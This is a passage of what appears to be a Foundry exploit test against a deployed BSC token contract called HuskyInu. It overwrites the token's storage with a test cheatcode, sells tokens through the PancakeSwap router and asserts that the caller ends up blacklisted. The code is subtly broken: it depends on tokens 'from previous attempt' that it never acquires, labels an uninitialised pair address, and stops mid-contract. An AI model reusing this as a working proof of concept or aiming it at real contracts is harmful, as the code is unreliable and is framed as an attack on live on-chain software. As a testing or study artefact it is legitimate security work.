contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────

    address private constant WETH = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c; // BSC WETH
    address private constant UNISWAP_V2_ROUTER = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
    address constant TARGET = 0x40a5Ad300Ee5a5b8bA6B50719647C19F2E52d5BE;
    address private uniswapV2Pair; // Will be initialized in exploit
    address private huskyOwner;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // No special setup needed - we'll work with the deployed contract
        // Label addresses for clarity
        vm.label(TARGET, "HuskyInu");
        vm.label(UNISWAP_V2_ROUTER, "PancakeRouter");
        vm.label(uniswapV2Pair, "HUSKY-WETH Pair");

        // Get the owner address from the contract
        huskyOwner = HuskyInu(TARGET).owner();
        vm.label(huskyOwner, "Husky Owner");
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // We already have Husky tokens from previous attempt
        uint256 huskyBalance = IERC20(TARGET).balanceOf(address(this));
        require(huskyBalance > 0, "No Husky tokens to sell");

        // First, let's ensure preventBotContract is true by setting it again
        // All 4 bools are in slot 15: preventBotContract, limitSell, limitBuy, taxStatus
        // We want preventBotContract = true (first byte = 1), others false (0)
        // So value = 0x01 (1 in first byte)
        bytes32 preventBotSlot = bytes32(uint256(15));
        vm.store(TARGET, preventBotSlot, bytes32(uint256(1))); // 0x01 in first byte

        // Also need to ensure limitSell and limitBuy are false (they should be by default)
        // And taxStatus should be false to avoid fee complications
        // Our storage write sets all 4 bools: 0x01 0x00 0x00 0x00 = 1

        // Now sell tokens back to trigger blacklist
        // Approve router to spend Husky tokens
        IERC20(TARGET).approve(UNISWAP_V2_ROUTER, type(uint256).max);

        // Prepare sell path: HUSKY -> WETH
        address weth = IUniswapV2Router02(UNISWAP_V2_ROUTER).WETH();
        address[] memory path = new address[](2);
        path[0] = TARGET;
        path[1] = weth;

        // Execute sell
        uint256 deadline = block.timestamp + 300;
        IUniswapV2Router02(UNISWAP_V2_ROUTER).swapExactTokensForTokensSupportingFeeOnTransferTokens(
            huskyBalance / 2, // Sell half to avoid any limits
            0, // accept any amount
            path,
            address(this),
            deadline
        );

        // Verify we're blacklisted
        bool isBlacklisted = HuskyInu(TARGET).blacklist(address(this));
        require(isBlacklisted, "Failed to get blacklisted");
    }



    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
